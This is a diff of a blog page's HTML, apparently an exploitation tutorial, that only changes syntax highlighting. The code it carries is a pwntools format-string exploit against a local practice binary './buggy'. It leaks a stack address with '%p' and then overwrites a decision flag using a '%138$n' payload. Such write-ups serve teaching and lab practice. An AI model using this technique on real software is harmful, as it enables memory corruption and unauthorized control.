@@ -289,14 +289,14 @@ OK! I am on it.
 
 <p>So, we have an address of the <em>name</em> variable. From <strong>gdb</strong> we know the address
 of <em>decision</em> variable. </p>
-<pre class="code literal-block"><span></span><span class="w"> </span><span class="p">...</span><span class="w"></span>
-<span class="mh">0x00000000000007e7</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;</span><span class="err">:</span><span class="w">  </span><span class="n">lea</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="o">[</span><span class="n">rbp-0x610</span><span class="o">]</span><span class="w">  </span><span class="n">#name</span><span class="w"></span>
-<span class="mh">0x00000000000007ee</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;</span><span class="err">:</span><span class="w">  </span><span class="n">mov</span><span class="w">    </span><span class="n">rsi</span><span class="p">,</span><span class="n">rax</span><span class="w"></span>
-<span class="mh">0x00000000000007f1</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="err">:</span><span class="w">  </span><span class="n">lea</span><span class="w">    </span><span class="n">rdi</span><span class="p">,</span><span class="o">[</span><span class="n">rip+0x18a</span><span class="o">]</span><span class="w"></span>
-<span class="mh">0x00000000000007f8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">99</span><span class="o">&gt;</span><span class="err">:</span><span class="w">  </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span><span class="w"></span>
-<span class="mh">0x00000000000007fd</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">104</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="k">call</span><span class="w">   </span><span class="mh">0x640</span><span class="w"> </span><span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
-<span class="w"> </span><span class="p">...</span><span class="w"></span>
-<span class="mh">0x0000000000000873</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">222</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">cmp</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="o">[</span><span class="n">rbp-0x614</span><span class="o">]</span><span class="p">,</span><span class="mh">0x0</span><span class="w"></span>
+<pre class="code literal-block"><span></span><span class="err"> ...</span>
+<span class="err">0x00000000000007e7 &lt;+82&gt;:  lea    rax,[rbp-0x610]  #name</span>
+<span class="err">0x00000000000007ee &lt;+89&gt;:  mov    rsi,rax</span>
+<span class="err">0x00000000000007f1 &lt;+92&gt;:  lea    rdi,[rip+0x18a]</span>
+<span class="err">0x00000000000007f8 &lt;+99&gt;:  mov    eax,0x0</span>
+<span class="err">0x00000000000007fd &lt;+104&gt;: call   0x640 &lt;__isoc99_scanf@plt&gt;</span>
+<span class="err"> ...</span>
+<span class="err">0x0000000000000873 &lt;+222&gt;: cmp    DWORD PTR [rbp-0x614],0x0</span>
 </pre>
 
 
@@ -313,19 +313,19 @@ in the payload we have this value before <code>n</code>.</p>
 
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./buggy'</span><span class="p">)</span>
 <span class="c1">#gdb.attach(p)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
 <span class="n">name</span> <span class="o">=</span> <span class="mi">512</span><span class="o">*</span><span class="s1">'A'</span><span class="o">+</span><span class="s1">'__%p__'</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 <span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
 <span class="n">address</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">'__'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"address: {address}"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address: </span><span class="si">{address}</span><span class="s2">"</span><span class="p">)</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">addr</span> <span class="o">-=</span> <span class="mi">4</span>
-<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"address of boolean: {hex(addr)}"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address of boolean: {hex(addr)}"</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'AAAAAAAA-%138$n-'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
 </pre>
 
 
